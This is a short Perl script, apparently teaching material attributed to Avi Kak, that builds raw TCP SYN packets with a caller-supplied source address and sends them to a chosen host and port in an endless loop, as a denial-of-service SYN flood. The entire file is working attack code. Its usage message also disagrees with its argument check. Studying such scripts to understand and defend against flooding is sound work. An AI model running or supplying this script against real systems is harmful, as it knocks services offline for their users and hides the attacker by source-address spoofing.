#!/usr/bin/perl

### DoS5.pl  
### by Avi Kak

#  This script is for creating a SYN flood on a designated
#  port.  But you must make sure that the port is open.  Use
#  my port_scan.pl to figure out if a port is open.

use strict;
use Net::RawIP;

die "usage syntax>>   DoS4.pl source_IP source_port " . 
                      "dest_IP dest_port how_many_packets $!\n" 
                      unless @ARGV == 4;

my ($srcIP, $srcPort, $destIP, $destPort) = @ARGV;

my $packet = new Net::RawIP;
$packet->set({ip => {saddr => $srcIP,
                     daddr => $destIP},
              tcp => {source => $srcPort,
                      dest =>   $destPort,
                      syn => 1,
                      seq => 111222}});
while(1) {
    $packet->send;
    sleep(1);
}
